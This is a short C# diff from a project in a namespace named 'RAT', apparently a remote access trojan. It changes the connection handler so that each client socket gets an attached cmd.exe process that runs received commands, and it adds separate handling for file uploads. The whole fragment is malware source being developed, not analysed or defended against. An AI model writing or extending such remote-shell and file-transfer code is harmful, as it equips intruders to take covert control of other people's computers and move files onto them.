@@ -55,20 +55,20 @@ namespace RAT.src.Logic.Sockets.Connection
             Socket listener = (Socket)res.AsyncState;
             Socket handler = listener.EndAccept(res);
 
-            // ---- TEMP
-            if (_socketStateLogic.State?.CurrentOperation == CurrentOperation.FileUpload)
+            // Check if we are waiting for file upload.
+            if (_socketStateLogic.State.FileUploadInformation?.FileUploadProgress == FileUploadProgress.Begins)
             {
-                _socketStateLogic.State.ClientFileUploadSocket = handler;
-                _socketConnectionReceiveLogic.BeginDataReceive(handler);
+                _socketStateLogic.State.FileUploadInformation.ClientFileUploadSocket = handler;
+                _socketConnectionReceiveLogic.BeginFileDataReceive(handler);
                 return;
             }
-            // ---- TEMP
 
             // Create the state object with cmd process attached to client.
             // This represents client with all needed information.
             var clientState = new StateObject()
             {
                 ClientMainSocket = handler,
+                FileUploadInformation = new FileUploadInformation(),
                 ClientCmdProcess = new Process()
                 {
                     StartInfo = new CmdConfigurator().GetCmdStartupConfiguration(),
@@ -87,7 +87,7 @@ namespace RAT.src.Logic.Sockets.Connection
             clientState.ClientCmdProcess.BeginErrorReadLine();
 
             // We are ready to receive cmd commands.
-            _socketConnectionReceiveLogic.BeginDataReceive(handler);
+            _socketConnectionReceiveLogic.BeginCommandReceive(handler);
         }
     }
 }
